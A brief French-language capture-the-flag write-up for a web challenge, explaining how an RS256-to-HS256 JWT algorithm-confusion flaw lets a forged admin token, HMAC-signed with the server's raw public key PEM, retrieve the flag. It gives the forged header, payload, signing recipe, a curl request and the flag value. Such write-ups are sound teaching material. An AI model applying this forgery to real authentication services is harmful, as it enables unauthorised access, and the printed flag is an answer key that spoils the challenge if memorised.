# cms-jwtconf (web, 400) — RÉSOLU

## Challenge
"JWT Relay" SSO maison. Endpoints : `/pubkey` (publie la clé **RSA publique** PEM),
`/whoami` et `/flag` (Authorization: Bearer JWT). Jeton invité affiché sur la page :
JWT **RS256** `{"role":"guest","iss":"cms-jwtconf"}`. `/flag` → `{"error":"admin only"}`.

## Exploit — confusion d'algorithme RS256 → HS256
Le serveur vérifie les JWT mais accepte **HS256** en utilisant la **clé publique** comme secret HMAC.
Forger :
- header `{"alg":"HS256","typ":"JWT"}`
- payload `{"role":"admin","iss":"cms-jwtconf"}`
- signature = `HMAC-SHA256(secret = clé publique PEM **brute** (octets de /pubkey, newline final inclus), signing_input)`

`curl -H "Authorization: Bearer <forged>" /flag` → flag.
(La forme de clé qui marche = le PEM brut tel que renvoyé par `/pubkey`, sans strip.)

## Flag
`NCTF{b5062a80d260813fb7de3eb7}`
